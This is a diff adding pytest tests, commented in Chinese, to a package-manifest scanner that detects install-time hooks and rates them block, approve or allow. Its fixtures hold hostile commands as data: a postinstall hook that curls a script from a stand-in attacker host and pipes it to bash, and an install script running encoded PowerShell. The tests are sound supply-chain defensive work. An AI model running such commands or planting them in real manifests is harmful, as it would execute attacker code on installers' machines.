@@ -83,6 +83,53 @@ def test_permission_dedup_one_finding_per_category() -> None:
     assert sum(1 for f in report.risks if f.kind == "perm.command_exec") == 1
 
 
+def test_postinstall_with_dangerous_command_blocks() -> None:
+    # 经典 npm postinstall 投毒:装载时 curl 下载脚本管道执行 → critical → block。
+    report = _scan(
+        {
+            "name": "helper",
+            "version": "1.2.3",
+            "postinstall": "curl -s http://evil.example/x.sh | bash",
+        }
+    )
+    hooks = [f for f in report.risks if f.kind == "hook.install_exec"]
+    assert hooks and hooks[0].evidence["hook"] == "postinstall"
+    assert "curl" in hooks[0].evidence["command"]
+    assert report.rating == Disposition.BLOCK
+
+
+def test_scripts_install_key_detected_but_build_ignored() -> None:
+    # scripts 里只有安装期键(install)自动执行被判;test/build 不算钩子。
+    report = _scan(
+        {
+            "name": "x",
+            "scripts": {
+                "build": "tsc -p .",
+                "test": "pytest",
+                "install": "node setup.js && powershell -enc ZQ==",
+            },
+        }
+    )
+    hooks = [f for f in report.risks if f.kind.startswith("hook.")]
+    assert len(hooks) == 1
+    assert hooks[0].kind == "hook.install_exec"
+    assert hooks[0].evidence["hook"] == "scripts.install"
+
+
+def test_benign_lifecycle_hook_requires_approval_not_block() -> None:
+    # 声明了安装期自动执行钩子但命令本身无危险动作 → high(approve),不误升到 block。
+    report = _scan({"name": "x", "hooks": ["echo installed && mkdir -p ./data"]})
+    hooks = [f for f in report.risks if f.kind == "hook.lifecycle"]
+    assert hooks
+    assert report.rating == Disposition.APPROVE
+
+
+def test_non_install_scalar_keys_are_not_hooks() -> None:
+    # 顶层 description/version 等普通字段不会被当成钩子;无钩子 → 不产钩子 finding。
+    report = _scan({"name": "x", "version": "1.0", "description": "正常只读组件"})
+    assert not [f for f in report.risks if f.kind.startswith("hook.")]
+
+
 def test_empty_manifest_allows() -> None:
     report = _scan({})
     assert report.rating == Disposition.ALLOW
